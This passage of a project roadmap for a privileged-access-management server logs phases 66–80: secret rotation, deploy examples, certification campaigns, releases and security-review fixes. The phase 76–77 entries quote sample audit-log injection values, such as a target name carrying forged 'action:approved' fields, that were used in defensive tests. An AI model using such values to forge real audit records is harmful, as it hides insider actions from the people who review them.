  ignored and the proxy binds its default port), and `POST /api/discovery/scan`
  takes `hosts`, not a CIDR

## Phase 80 — The review of Phase 78 ✅

Fourteen defects in one phase — the worst return of any review in this repo. The
count matters less than the shapes, which are all failures of the same kind:
checking a claim one level less deeply than the claim was stated.

- [x] **A rotation inverted the break-glass quorum path** (finding BE). Phase 78
  said, in the architecture doc and the admin guide, that "a single swap reaches
  every authentication surface". The *resolver* sharing was verified; whether
  anything else held a copy of the same value was not. `api.Server` did, decoded
  once at construction, so after a rotation `POST /api/breakglass/unseal` —
  unauthenticated — accepted shares of the **retired** key and rejected the new
  one. Fixed by **deleting the second copy**, not adding a second setter:
  `Options.BreakGlassHashHex` is gone and the handler asks
  `Resolver.MatchesBreakGlass`
- [x] **On Kubernetes it could never have worked** (BF). The projected JWT was
  read once at boot and re-sent forever; the repo's own manifest expires it every
  600s. `Config.JWTFile` is now re-read on every authenticate
- [x] **The feature was inert exactly where it was aimed** (BM). Ownership meant
  "Conjur *filled* this at boot", and sourcing only fills what the environment
  left empty — while docker-compose hard-requires `PAM_API_KEY`, the K8s secret
  ships it and the OVA generates it. Ownership is now *probed*: Conjur manages
  it. The startup log names what will really be refreshed, and warns when a
  secret is both pinned in the environment and managed in Conjur
- [x] **A test that could not fail** (BJ), guarding the phase's headline safety
  claim. Its needles used env names (`master_key`) against hyphenated variable
  ids (`pamv1/master-key`), so removing *both* skip guards left it green. It now
  asserts the positive form — the set of ids fetched must be exactly the
  refreshable ones — and the same mutation fails it
- [x] **Per-secret appliers** (BI, BK): one malformed break-glass hash no longer
  blocks an API-key rotation forever, and the applier map is the single
  definition of "refreshable", so a secret with no applier can never be audited
  as refreshed
- [x] **Fail-closed audit** (BL): the record precedes the swap, matching §6.4.
  **State out of `os.Getenv`** (BH): a failed environment write could otherwise
  reinstate the retired key on a later tick
- [x] **One strength rule for the bootstrap key** (BG): `config.ValidateBootstrapAPIKey`,
  so a running server cannot adopt a key the next restart refuses to boot with
- [x] **Observability** (BN, BO, BQ, BR): a deleted variable is warned about
  rather than silently ignored (deleting is not revoking), a failing refresh
  increments `pam_secret_refresh_failures_total` and fires an alert at `Error`,
  every declining branch at startup says why, and the actor is `system-conjur`
- [x] **`PAM_CONJUR_VARS` validates the id and refuses duplicates** (BP)
- [x] **The Kubernetes docs and IaC caught up** (BS) — the Conjur README no
  longer lists this phase's own feature under "Deferred", and the deployment,
  configmap, `CODE-GUIDE` and `PORTS-AND-FLOWS` all carry the two new variables
- [x] **One reported finding refuted**: `deploy/.sops.yaml` was changed in the
  Phase 79 commit, not Phase 78 — the reviewer read a tree with the next phase in
  progress

## Phase 79 — Deploy examples, and the wholesale apply that overwrote your secret ✅

Closes the Phase 14 deferral. Three things the docs described and never shipped —
plus a bug found by trying to build what they described.

- [x] **`kubectl apply -f deploy/k8s/` overwrote the secret you had just
  created.** `secret.example.yaml` declares `metadata.name: pam-secrets` with
  `PAM_MASTER_KEY: "CHANGE_ME"`, and the README's quickstart told you to
  `kubectl create secret generic pam-secrets` with the real values **and then**
  apply the whole directory. `docs/REQUIREMENTS.md` already warned against
  exactly this ("do NOT `kubectl apply -f deploy/k8s/` wholesale"), so the two
  documents contradicted each other and the more prominent one was wrong. Both
  READMEs now use **`-k`**, which resolves a curated `kustomization.yaml`
  carrying no secret material at all — and CI asserts that base contains neither
  `CHANGE_ME` nor ciphertext, so it cannot regain one
- [x] **A working Flux example** (`deploy/k8s/flux/`): a `GitRepository` pinned to
  a **tag** rather than a branch — a controller following `main` deploys whatever
  lands there, which is the supply-chain problem the signed releases exist to
  avoid — and **two** `Kustomization`s. Two rather than one because only the
  secrets need `.spec.decryption`, and the workload must not start before its
  secret exists, which `dependsOn` says directly
- [x] **A working `helm secrets` values file**
  (`deploy/helm/pamv1/secrets.example.sops.yaml`), really sealed and verified in
  CI. The SOPS README had advertised this flow, and `.sops.yaml` had carried a
  creation rule for it, with nothing behind either
- [x] **Cloud-KMS recipients** documented in `.sops.yaml` for AWS KMS, GCP KMS,
  Azure Key Vault and Vault Transit. The reasoning is the pluggable KEK's: an
  `age` private key is itself a secret somebody must distribute, which is the
  problem it was meant to solve one level down. SOPS encrypts the data key to
  *every* recipient and any one decrypts, so adding a KMS beside `age` is
  additive — and is also the migration path
- [x] **The CloudNativePG password becomes an input, not an output.** CNPG
  generates it into a secret it manages, which leaves a human reading it out of
  the running cluster and pasting it into `PAM_DATABASE_URL` — two copies of one
  password kept in step by hand. `pg-app.sops.example.yaml` seals it and
  `bootstrap.initdb.secret` consumes it. Left **commented** in the shipped
  manifest on purpose: uncommenting it without creating the secret makes the
  cluster fail to bootstrap
- [x] `verify.sh` covers all three sealed files now, not one — they would
  otherwise have been the only committed sealed material nothing checked, and a
  plaintext commit is the accident that script exists to catch. CI additionally
  builds both kustomize bases, so a broken resource list fails in CI rather than
  at reconcile time
- [x] Both new sealed paths are gitignored like the original: a safety default
  against committing a half-finished file, lifted with `git add -f`

## Phase 78 — Config depth: secrets that can be rotated without a restart ✅

Closes the Phase 12 deferral. Sourcing was one-shot at boot, so rotating the
bootstrap API key — the most widely shared credential in the system — meant
restarting every replica. That friction is why keys do not get rotated.

- [x] **Per-variable override.** `PAM_CONJUR_VARS` maps individual secrets to
  arbitrary Conjur variable ids (`PAM_API_KEY=prod/keys/api`). The
  `<prefix>/<suffix>` convention is a guess about someone else's policy, and a
  site that cannot rename its variables could not use the integration at all —
  the feature ships and is never turned on. An unknown name is **fail-loud**,
  because a silently ignored typo is how an operator concludes it does not work
- [x] **Runtime refresh**, opt-in via `PAM_CONJUR_REFRESH_MIN`, applied to a
  running server with no restart. Not leader-locked: every replica holds its own
  copy, so a leader-only refresh is the split-brain version of the bug
- [x] **Only two of the six secrets are refreshable, and the exclusions are the
  design.** `PAM_API_KEY` and `PAM_BREAK_GLASS_KEY_HASH` are pure comparison
  values. `PAM_MASTER_KEY` is the KEK — changing it does not rotate the vault, it
  makes it undecryptable, and `-rotate-kek` offline is the path.
  `PAM_DATABASE_URL` is bound into a live pool. `PAM_BROKER_AUDIT_KEY` keys the
  HMAC chain, so a swap invalidates history rather than re-keying it, and
  `PAM_BROKER_AUDIT_SIGN_SEED` already has a rotation path that keeps the retired
  public half trusted
- [x] **The pinned secrets are not fetched at all.** Pulling the KEK across the
  network every tick to notice a change nothing can act on multiplies the
  exposure of the most valuable secret in the system to produce a log line. The
  startup log names both lists instead, so an operator learns what will be picked
  up *before* rotating rather than by watching nothing happen
- [x] `auth.Resolver` holds the pair behind an `atomic.Pointer`. `Resolve` runs on
  every request on every connection, and **one resolver is shared by the API, the
  SSH proxy and both database proxies**, so a single swap reaches every
  authentication surface. Proven by a `-race` test, verified to trip the detector
  against the plain-field shape it replaced
- [x] **Fail-safe on every partial outcome**, because this runs unattended against
  a network service and manages the values that let people in: a 404 or empty
  value keeps the current secret (a policy edit must never disable break-glass), a
  malformed hash is rejected *before* anything is swapped, a rejected value is not
  remembered as applied, and Conjur only owns what it actually filled at boot —
  `conjur.Source` now returns that list, because after startup a non-empty
  `PAM_API_KEY` is indistinguishable from one the operator set
- [x] New audit action `config.secret_refreshed`, naming the keys and never the
  values

## Phase 77a — v0.14.3 ✅

Phase 77 is a security fix and `v0.14.2` predated it, so the same rule that drove
the last release applies again: **after any security fix, check whether the pinned
tag predates it.** Applying it consistently is the point — the rule is worth
nothing if it only fires for the findings that feel serious enough.

- [x] **v0.14.3** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-08 as `ghcr.io/morandeirachema/pamv1:0.14.3` (also `latest`),
  digest
  `sha256:1fc4f75251ea0efe87b879500cb286e846841d3c96b4c5e728648c04d88017c2`,
  **public** — an anonymous manifest pull returns 200. Keyless-signed with the
  SBOM and SLSA provenance attached as OCI referrers (a
  `application/vnd.dev.sigstore.bundle.v0.3+json` bundle plus the two
  attestations, **not** the legacy `.sig`/`.att` tags — see Phase 76a), and the
  GitHub Release carries `sbom.spdx.json`
- [x] All four pins together, Helm `version` 0.5.2 → 0.5.3 alongside `appVersion`
- [x] Both READMEs restated, label-vs-URL equality re-checked
- [x] `CHANGELOG` records the one operator-visible consequence: a create or update
  carrying a colon, a control character or over 128 bytes now returns `422`.
  Existing names are not rejected retroactively, so nothing breaks on upgrade

## Phase 77 — A name cannot forge a field ✅

Closes finding **BD**, the residual Phase 76 recorded and deliberately left. The
audit trail is evidence against insiders — which is the whole reason four-eyes and
break-glass exist — so *"only an admin can forge it"* was the wrong resting place
for a PAM. An admin who names a target `prod-db action:approved reason:emergency`
puts forged fields into the record of **every operator's** session on that target,
not just their own.

- [x] **Fixed at the boundary, not at the ~145 sinks.** Quoting the sinks would
  rewrite the format every audit assertion in the suite greps for. `validName`
  refuses **exactly two things** — control characters (a newline splits one record
  into what reads as two) and **the colon** (the field separator) — plus a
  128-byte bound, because a value whose length the submitter chooses is an audit
  row whose size they choose
- [x] **Deliberately permissive.** Spaces, dots, slashes, `@`, accents and CJK all
  still work: a name with a space but no colon cannot forge a `key:value` pair, so
  there is no reason to forbid `Prod DB 01`. `TestOrdinaryNamesStillWork` is the
  half that decides whether this survives — a validator that rejects real names
  gets removed, and then the class is back
- [x] Applied to every create/update taking a human-chosen name: targets, users,
  safes, campaigns (name **and** reviewer), profiles, app secrets, agent keys
  (name **and** the owner the broker's four-eyes refusal is keyed on), vendors,
  credentials, and the `subject` of a target grant and a safe membership
- [x] **What validation cannot cover is quoted at the sink instead.** An IPv6
  literal legitimately contains colons, so hosts are not charset-checked; the six
  `host:%s` sinks now use `auditField`, which also fixes `host:2001:db8::1:22`
  being ambiguous with nobody attacking it. SPIFFE IDs stay quoted as Phase 76
  left them
- [x] Tests: `TestNamesAreValidatedAtEveryBoundary` walks seven boundaries with
  six hostile forms each — **42 values, every one of them accepted before this
  phase**, verified by disabling the validator and counting
- [x] **Residual, deliberate:** names already stored are not rejected
  retroactively — the same call Phase 46 made for grants with no recorded creator.
  A name that predates this phase keeps working; only a create or update is held
  to the rule

## Phase 76a — v0.14.2 ✅

Phase 76 fixed three audit-integrity defects, and `v0.14.1` predated all of them
— so every pin in `deploy/` resolved to an image without them. That is the exact
shape of finding AN, which is why the rule is *check whether the pinned tag
predates the fix* after any security change, not *after any feature*.

- [x] **v0.14.2** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-08 as `ghcr.io/morandeirachema/pamv1:0.14.2` (also `latest`),
  digest
  `sha256:8df04bf5728ab44ded945281dd8c22419d1c1b83ec1882cdfbdc0e4f5df2c9f1`,
  **public** — an anonymous manifest pull returns 200. Signed keyless with the
  SBOM and SLSA provenance attested; the GitHub Release carries
  `sbom.spdx.json`, and the provenance is in Rekor (`logIndex 2386044650`)
- [x] **Where the signature lives has changed, and a check written against the
  old shape reports a false alarm.** Verifying by listing registry tags for
  `sha256-<digest>.sig` / `.att` finds **nothing** for any release since v0.10.0
  — not because signing broke, but because cosign now attaches artifacts through
  the **OCI referrers API**, under a single suffix-less `sha256-<digest>` tag
  holding a `application/vnd.dev.sigstore.bundle.v0.3+json` bundle plus the two
  attestations. `cosign verify` and `gh attestation verify` resolve that
  automatically, so the README's documented commands were never affected — only
  a hand-rolled tag-listing check would be, and it would conclude the opposite of
  the truth
- [x] All four pins moved together — `deploy/k8s/deployment.yaml`,
  `deploy/k8s/conjur/deployment.yaml`, `deploy/terraform/variables.tf`, and the
  Helm chart's **`version` (0.5.1 → 0.5.2) as well as its `appVersion`**
- [x] Both READMEs restated. This also fixed a **label/URL mismatch that had been
  live since v0.11.2**: `README.es.md` still announced *"Release vigente:
  v0.11.2 (2026-08-07)"* while the image reference beside it read `0.14.1`. The
  Spanish README's prose version had simply stopped being moved with the pins —
  which is the same failure the pin-currency rule exists to catch, one file over
- [x] `CHANGELOG.md` `[Unreleased]` promoted with the one upgrade note that
  matters: `PAM_CERT_REMIND_DAYS` outside `0`–`366` now stops the server at
  startup

## Phase 76 — One sanitiser, and the three places that needed it ✅

The sweep over phases 66–75. Ten phases, never read as a whole, and the newest
production code in the repo. The authorization surface held — the new campaign
routes are scoped like the rest of the API, `GET /api/campaigns/mine` reads only
the caller's queue, reviewer assignment is advisory by design and says so in three
places, and the store's split into nineteen role interfaces is pinned at 149
methods by test. What the sweep found was **one class in three unrelated places**,
and the structural reason it kept recurring.

- [x] **The structural fix first.** `auditField` existed as **two byte-identical
  copies** — `internal/api` and `internal/proxy` — and not at all in
  `internal/guacd`, which also writes audit details. That is why the clipboard
  record was never sanitised: the function was not there to call. New
  `internal/auditfmt` holds the one implementation; api and proxy keep their
  package-local `auditField` name (it is used on nearly every handler) delegating
  to it, so no call site moved
- [x] **A hostile agent identity forged the actor in the delegation record**
  (finding AY). `broker.token.exchanged` was assembled unquoted and quoted as ONE
  string by the handler. That stops a value breaking *out* of the record and not
  one forging fields *inside* it: the console un-quotes, then splits on spaces,
  and takes last-wins. Reproduced against the shipped console script — an
  `on_behalf_of` of `ops-team actor:spiffe://trusted/root` made the screen report
  an actor the token was never minted for. Every field is now quoted at the
  source, matching the refusal path three lines above it
- [x] **A clipboard mimetype off the wire went raw into the record that evidences
  a copy** (finding AZ). It is the *second* field, so a mimetype of
  `text/plain bytes:0 sha256:00…` put a forged byte count and digest ahead of the
  real ones — a large exfiltration reading as an empty transfer — and unbounded it
  was an audit-flooding primitive, since clipboard transfers repeat at will
- [x] **A reviewer name forged fields into a certification reminder**
  (finding BA), one phase after the assignment event three lines away got this
  right. Names quoted and bounded, the list capped at 8 with a `+N_more` tail, and
  the campaign name bounded at both sites where it was quoted-but-unbounded
- [x] **A failing store opened a new campaign every hour, forever** (finding BB).
  `spawnDueCampaigns` advanced the schedule **last**, so any failure after the
  insert left the anchor still due and the next tick created another campaign. The
  period is now claimed first: a failure to claim creates nothing, and a failure
  after it costs at most one skipped period, logged at `Error`. A missed review is
  bounded and loud; an unbounded run of duplicates is neither
- [x] **`PAM_CERT_REMIND_DAYS` gets the range check every comparable knob has**
  (finding BC): `0`–`366`, fail-loud at startup
- [x] Regression tests for all three injections, **each verified to fail against
  the pre-fix code** — `agentid.TestExchangeAuditResistsFieldForgery` through the
  real `Exchange` call, `guacd.TestClipDetailResistsMimetypeForgery` +
  `TestClipDetailBoundsTheMimetype`, `api.TestCampaignReminderResistsAuditInjection`
- [x] **Left open and recorded as finding BD**: names are validated non-empty
  only, so roughly 145 `target:%s`-style sinks stay forgeable by whoever can name
  a target, user or safe. Quoting the sinks would rewrite the format every audit
  assertion greps for; the proportionate fix is boundary validation — reject
  control characters and colons in names — which closes the class in four places
  and changes no record format. Its own phase, not a footnote to this one —
  ✅ closed by Phase 77

## Phase 71 — The console gets a safety net ✅

The first of five improvements from the 2026-08-08 repo audit, and the one with
evidence behind it. The portal is **~2,500 lines of JavaScript** embedded in
`index.html`. `go:embed` copies bytes without parsing them, `internal/web`'s two
tests checked a CSP nonce and a substring, and **nothing in CI ran node** — so a
syntax error compiled clean, tested clean, shipped, and broke the portal at
runtime.

Three real defects had already reached `main` through that hole, each caught only
by rendering a screen by hand: a column pushed off the terminal so a refused row
hid its *reason* (67b), a header wrong for half its rows, and — the one that
matters — **the console requiring `manage_users` to decide a certification item
while the API had required `approve` since Phase 39**, so the dedicated approver
role saw a read-only screen for six phases and every security sweep missed it,
because no sweep reads the console.

- [x] **`node --check` on the embedded script**, as a Go test and as an explicit
  CI step. The Go test skips when node is absent, which is right for a laptop;
  the CI step runs `node --version` on its own line first, so a runner without
  node fails the job rather than passing on a skip
- [x] **A table row must not widen with its data.** Every covered screen renders
  twice — short values and pathological ones — and the rows must come out the
  same width. That is the invariant behind the bug that shipped, and it is
  input-relative, so unlike a pixel assertion it cannot go stale
- [x] **It found two more of the same bug immediately**, both mine: the campaigns
  list grew from 83 to 237 characters on a long name (Phase 68) and the review
  queue from 32 to 84 on a long subject (Phase 69). `campitems` was fixed in the
  same pass before it could be reported
- [x] **`cell()` is promoted to a shared helper** beside `pad()`, with the rule
  written down: `cell` for anything a user controls, `pad` only for values bounded
  by their own domain. The truncating version had existed since 67b — inside one
  screen, where no other screen could reach it
- [x] **The harness refuses to pass vacuously.** Every helper it extracts must be
  found, at least one screen must render, and each screen must produce rows — all
  three are failures, not skips. It proved this on itself: promoting `cell`
  broke extraction and the run failed with *"no screen rendered at all — the
  harness is not testing anything"* rather than reporting green
- [x] **Verified against the pre-fix code**: with the unbounded cells restored the
  suite fails with the exact character counts above

**Still open from the audit**, in order: the 137-method `store.Store` (the main
tax on every change), `internal/api` at 26% of the tree with a 63-field `Server`,
the coverage figure understating itself by ~4 points, and the smaller items.

## Phase 70b — v0.14.0 ✅

Minor, and it carries **two** migrations (`0030`, `0031`) — both additive, both
rollback-safe on the grounds already checked for `0029`.

- [x] **v0.14.0** through the test-gated pipeline, rehearsed first on `main`.
  Published 2026-08-08 as `ghcr.io/morandeirachema/pamv1:0.14.0`, digest
  `sha256:be024e68394c4500b1c49d57214109612d67667d27ad7ade216c8f10e94d5bcb`,
  public — anonymous pull verified
- [x] **All four pins move together** (both k8s deployments, terraform, Helm
  `appVersion` + chart `0.5.0`), both READMEs restate the current release, and
  every release link passes the label/URL agreement check
- [x] **Both new audit actions and the new environment variable are called out in
  the release notes** rather than left in a phase bullet: `PAM_CERT_REMIND_DAYS`
  changes behaviour on upgrade (reminders start firing for campaigns that already
  have due dates), and a SIEM consumer needs to know two action names appeared

## Phase 70a — Documentation currency pass ✅

The living-docs rule says a doc is updated in the same change as the code. Nine
phases had shipped since the last sweep of the whole set, so this is the audit of
that rule rather than an application of it — and it found three things.

- [x] **`PAM_CERT_REMIND_DAYS` was missing from the §4 config table.** Found by a
  check scoped to §4 itself; a first attempt searched the whole document and
  passed, because the change-log entry mentions the variable. A currency check
  that reads the wrong section reports currency it has not verified — the same
  shape as the drift check that manufactured drift in Phase 63.
- [x] **`SECURITY-GAPS.md` had never recorded the Phase 66 review** — three
  findings in the code that closed the 2026-08-07 sweep. This is the Phase 65
  currency gap recurring one phase later, so the three are now written up as
  findings AV–AX with what each cost.
- [x] **A process finding recorded**, because it invalidated reporting rather
  than code: three low-level change-log entries (65b, 67b, 68) were written by a
  build script using `str.replace` with an anchor that did not match, and
  `replace` is a silent no-op, so the docs were reported updated when they were
  not. Every replacement now asserts its anchor first.
- [x] **All 18 doc status markers moved to 0–70** — and where phases 62–70 did
  not touch a document's subject, the marker **says so** (ports and flows add
  nothing; external-infra gaps needed no infrastructure; the agent threat model
  is unchanged; the RDP/VNC recipes and the backup runbook are unaffected). A
  marker bumped without that check is worth less than a stale one, because it
  claims a review that did not happen.
- [x] **Content updated where the subject did change**: the high-level
  architecture's certification row and change log, the NIS2 Art. 21(2)(f) and (i)
  rows (a recurring campaign *is* the periodic re-assessment, and its reminders
  make a lapse visible), the user guide's menu-17 section (scope, the F7 queue,
  reminders, and that assignment is not a permission), and the code guide's
  startup-worker list.

## Phase 70 — A campaign nudges before it lapses ✅

Closes the **last** item of the Phase 19 deferral. Recertification lapses
quietly: the campaign stays open, the items stay pending, and nothing happens
until an auditor asks. Phase 69 gave every item an owner; this is what tells them.

- [x] **The first nudge is `PAM_CERT_REMIND_DAYS` before the due date** (default
  7; 0 disables). A campaign created with a due date already inside the window —
  or past it — reminds on the next tick rather than being skipped: "you gave me
  two days" is exactly when a nudge is worth most, and silently declining because
  the ideal moment had gone would be this feature's own failure mode
- [x] **The nudge is actionable.** It carries the pending count, an
  `overdue_by_Nd` / `in_Nd` phrase — said in words, because a human is deciding
  whether to care today — and a **per-reviewer breakdown** naming who is holding
  it up, which is what assignment bought. Sorted, so an unchanged state renders
  an unchanged string rather than looking like a change
- [x] **It repeats daily** while items are pending, so an overdue review stays
  visible instead of scrolling past once
- [x] **It stops on the two conditions that mean the work is over.** A closed
  campaign never reminds (the store predicate). And a campaign with **nothing
  pending has its reminder cancelled**, even though nobody closed it — nagging
  about finished work is how an alert channel gets muted, and a muted channel is
  where the next lapse hides. Closing it stays a human's call
- [x] **On the existing seam**: the hourly leader-locked campaign tick, the same
  `alert.Notifier` break-glass and analytics use, and an audit event
  (`certification.reminder`) so the trail shows the nudge went out
- [x] **Recurring children inherit it** — a spawned campaign gets its own due
  date and its own reminder, so a quarterly series nudges every quarter
- [x] **Tests**: the nudge and its content, that it reschedules rather than
  firing twice in a window, that it fires again a day later, both stop conditions
  (decided-out and closed), the window arithmetic including the clamp and the
  disable switch, and the store contract on both implementations

**Migration `0031`**, additive (NULL = no reminder). **New audit action**
`certification.reminder`. **The Phase 19 deferral is now closed entirely.**

## Phase 69 — An item has an owner ✅

Closes the assignment half of the Phase 19 deferral. A campaign's items were a
flat list with no owner, so nothing sat with anybody in particular — and work
that is everyone's is nobody's.

- [x] **A campaign names a default reviewer**, stamped onto every item it
  snapshots; **one item can be reassigned** (`PUT …/items/{itemID}/reviewer`,
  `manage_users`, scoped to the campaign in the path like every other child
  resource), and an empty value unassigns
- [x] **A reviewer has a queue**: `GET /api/campaigns/mine` (`CapApprove`) —
  **pending** items in **open** campaigns only, because a decided item is
  finished work and a closed campaign's leftovers are not a queue. Registered as
  a literal so `/api/campaigns/{id}` cannot swallow it, which the test pins
- [x] **Assignment is ADVISORY, and that is deliberate.** It routes work and
  makes a queue visible; it is not an authorization gate. Anyone holding
  `approve` can still decide any item, and `DecidedBy` records who actually did —
  so accountability comes from the trail. Binding it would add a deadlock (the
  assigned reviewer leaves and the campaign cannot be closed) without adding
  evidence, since any approver could reassign the item anyway. Said in the code,
  the API docs and on the assign screen, so nobody reads the field as a control
  it is not
- [x] **A pre-existing console bug, found while building the screen**: the items
  screen gated deciding on `manage_users`, while the API has gated it on
  `approve` since **Phase 39**. So the dedicated `approver` role — the entire
  point of that split — saw the review screen as read-only, while the API would
  have accepted its decisions. Now `approve`, with assignment staying
  `manage_users`
- [x] **Console**: reviewer column and `7=Assign reviewer` on the items screen, a
  `PAMCMPASG` assign screen, and `PAMMYQUE` (F7 from menu 17) for the queue. Both
  new screens rendered with live data at the terminal's real width and inspected
- [x] **Tests**: store contract on both implementations (round-trip, queue
  predicate, reassignment moves an item between queues, `ErrNotFound`, and that
  deciding *or* closing the campaign takes an item out of the queue); and an API
  test covering inheritance, the queue, reassignment, cross-campaign scoping, and
  that `/campaigns/mine` is not parsed as an id

**Migration `0030`**, additive with an empty default. **New audit action**
`certification.item_assigned`.

**The Phase 19 deferral is now down to one item**: reminders — nudging a reviewer
before the due date. With assignment in place there is finally somebody to nudge.

## Phase 68a — v0.13.0 ✅

Minor, and the first release since 0.10.0 to carry a **migration**, so the
upgrade note is the point of the release rather than a footnote.

- [x] **v0.13.0** through the test-gated pipeline, rehearsed first on `main`.
  Published 2026-08-08 as `ghcr.io/morandeirachema/pamv1:0.13.0`, digest
  `sha256:b239f0a4c4bd0aaa3aec0088c78a0eabcbe9ee1549e725ff7e556acbf4eb5131`,
  public — anonymous pull verified
- [x] **Migration `0029` is additive and its rollback was checked, not assumed.**
  The added columns are `NOT NULL DEFAULT` or nullable; 0.12.0 names its columns
  explicitly in every campaign read and write; and the migration runner applies
  only what it is missing, never objecting to a database ahead of it. So a
  0.12.0 binary starts unchanged against the migrated schema and ignores the new
  fields — which is the difference between "should be fine" and a rollback an
  operator can actually perform at 3am
- [x] **All four pins move together** (both k8s deployments, terraform, Helm
  `appVersion` + chart `0.4.0`), both READMEs restate the current release, and
  every release link passes the label/URL agreement check that caught two broken
  ones last time

## Phase 68 — Campaigns you can scope and schedule ✅

Closes the first half of the Phase 19 deferral. A campaign snapshotted **every**
grant and safe member in the estate, which on anything past a demo is a list of
thousands that nobody completes — and a review nobody completes attests to
nothing. Scheduling it without scoping it would only have automated that.

- [x] **Scope: one safe, or one subject.** A safe-scoped campaign covers both
  halves of what "access to that safe" means — its members **and** the grants on
  every target assigned to it, because covering only the members would leave a
  target in the safe reachable by a direct grant the review never showed. A
  subject-scoped one covers everything a person or role holds anywhere, which is
  the leaver review. Filtering happens at snapshot time, not on the way out: a
  campaign's items are its evidence, and asking someone to certify a list they
  were not asked to review is worse than a list that is too long
- [x] **An unknown scope is refused, never widened.** `scope_kind` outside the
  enum, a `scope_safe_id` naming no safe, or a scope missing its value are 422 —
  falling back to "review everything" would turn a typo into precisely the
  unreviewable campaign the scope exists to prevent, with nobody told
- [x] **Recurrence, anchored.** `recur_days` makes a campaign the anchor of a
  series; every N days the scheduler opens a fresh one with the same name and
  scope. The schedule lives on the anchor and never moves, so there is no
  invariant about which row in a series carries it and a series cannot fork
- [x] **Closing the anchor stops the series** — the only stop button, and the one
  an operator reaches for first, so it is the one that works. Enforced in the
  store's own predicate rather than by the caller remembering
- [x] **Leader-locked and always on.** N replicas open one campaign, not N; the
  worker needs no interval to configure, because a recertification schedule that
  only runs when a second variable was also remembered lapses exactly where it
  matters. It does nothing until somebody makes a campaign recurring
- [x] **Advance after the spawn.** A crash between the two repeats a review next
  tick; the other order silently skips a quarter. Duplicating a review is
  recoverable, missing one is not
- [x] **Console** (menu 17): the new-campaign screen takes a scope and a repeat
  interval, the list names each campaign's scope — by safe **name**, not id —
  and marks a repeating one in amber. Both screens were rendered with live data
  at the terminal's real width and inspected, the Phase 67b method
- [x] **Tests**: store contract on both implementations (scope round-trips, the
  due predicate, advancing, and that a closed anchor stops spawning); the API
  scoping test covering all three scopes and six refusals; and an internal test
  of the scheduler proving a child inherits the scope, carries no schedule of its
  own, and that closing the anchor ends the series

**Migration `0029`**, additive with defaults that reproduce the old behaviour, so
every existing campaign keeps meaning exactly what it meant. **Audit-detail
change**: `certification.campaign_created` gains `scope:` / `safe:` / `subject:` /
`recur_days:` / `recurring_from:`, so the trail records what a campaign covered
rather than leaving a reader to infer it from an item count.

**Still open from the Phase 19 deferral**, and deliberately not attempted here:
**reviewer assignment** (items routed to a named reviewer) and **reminders**
(nudging before a due date). Both are real; neither is worth bolting onto this
change, and scope + schedule is the pair that makes quarterly recertification of
a safe work end to end.

## Phase 67b — The screen fits ✅

Phase 67 shipped a screen nobody had looked at. The verification was real as far
as it went — the JSON shapes, the parser against Go-authentic quoting, the served
page, `node --check` — but it stopped at "the data is right", and a table is also
a layout. Rendering it with live data at the terminal's actual width found two
defects in the first frame.

- [x] **The reason column had fallen off the screen.** Every cell held a full
  SPIFFE ID, and a chain concatenates two or more of them — so the row ran past
  `#term`'s `max-width: 980px` and took the last column with it, which is where a
  refusal's reason lives. The reason is the entire value of a refused row, and it
  was invisible
- [x] **The prefix was the problem, not the width.** `spiffe://<trust-domain>/`
  is identical on every row of this screen — roughly 24 columns per cell carrying
  no information. It is stated once above the table and the rows show paths, so
  `/ops/sub-agent>/ops/planner` fits where the full form did not
- [x] **Cells truncate before they pad.** `pad()` alone lets one long value push
  the last column off the edge — the failure above, one input away from returning
  under a different name
- [x] **The column header was wrong for half the rows**: a refused row names the
  *delegator* that asked, not an actor, so "Actor (sub-agent)" became
  "Actor / delegator" with a line saying so
- [x] **All three states rendered and inspected**: populated (a real exchange
  plus two real refusals driven against a running server with genuine JWT-SVIDs),
  disabled, and empty

The method is worth keeping: the screen's template and helpers were lifted out
and rendered in node against data pulled from the live server, then screenshotted
headless at `#term`'s real width. No browser automation, and it still catches
what only looking catches.

## Phase 67a — v0.12.0 ✅

A **minor** rather than a patch, because Phase 67 adds a capability rather than
fixing one — and the capability it adds is the last curl-only one, so the console
parity the README has claimed since Phase 25 is finally true rather than nearly.

- [x] **v0.12.0** through the test-gated pipeline, **rehearsed first** with the
  `workflow_dispatch` run that now actually builds — the discipline Phase 65b
  bought and Phase 66 tidied. Published 2026-08-07 as
  `ghcr.io/morandeirachema/pamv1:0.12.0`, digest
  `sha256:f324e2b14ba9ce49706cd14c51f7ecfb1326d1a874f2fcced7f76eee88a61f8e`,
  public — anonymous pull verified
- [x] **All four pins move together** (both k8s deployments, terraform, Helm
  `appVersion` + chart `0.3.0`) and both READMEs restate the current release: the
  same checklist as 62b, 65a and 65c, because the failure it exists to prevent is
  one flavour left behind
- [x] **Two broken release links repaired**, found while rewriting them: the
  README carried `[v0.11.1](…/tag/v0.11.2)` twice — a label saying one version
  while its link went to another, left by a context-scoped `sed` during the
  previous release. Every release link in both READMEs is now checked for
  label/URL agreement, which is a one-line check that would have caught it

## Phase 67 — Console screen for the token exchange ✅

The last curl-only capability, and the one place the README's *full console
parity* claim was false. Menu **27, Delegated agent tokens (RFC 8693)**, gated on
`read_audit` — the same gate as the JWKS endpoint it reads.

- [x] **Read-only by nature, not by omission.** Minting is an agent presenting
  its *own* credential to `POST /v1/token`; a human at a terminal cannot do that
  on an agent's behalf and should not be able to, so there is deliberately
  nothing here to press. The screen says so rather than leaving a reader hunting
  for the button
- [x] **The signing key** — `kid`, key type, curve and algorithm from
  `GET /v1/token/jwks`, so an auditor holding a delegated token from the trail
  can confirm which key signed it and see that a rotation actually changed it.
  With the feature off the screen says so and names the variable
- [x] **The delegation chains** come from the audit trail, because there is
  nothing else to read: a minted SVID is stateless — the broker signs it and
  forgets it — so `broker.token.exchanged` is the only record that a delegation
  ever existed. Refusals (`broker.token.refused`) are shown beside them, since a
  run of them is what a probing or runaway agent looks like
- [x] **The detail parser handles both quoting granularities** the server uses:
  a success detail is `strconv.Quote`d **whole**, a refusal quotes each untrusted
  **value** separately. It scans rather than splitting on whitespace, because a
  quoted value may contain spaces and a SPIFFE ID is mostly colons
- [x] **Verified against a running server**: the JWKS shape and a live `kid` with
  the exchange enabled, the 404-disabled path, and the parser run in node over
  audit details generated by Go's own `strconv.Quote` — including a hostile
  delegator name carrying a quote, a newline and a forged `reason:granted`, which
  is captured whole while `reason` still reads the real value. Not verified: the
  rendered screen in a browser

## Phase 66 — The review of 62–65 ✅

The 52a–52g discipline applied to the phases that closed the sweep: read them the
way the sweep read everything else, on the argument that new code is where the
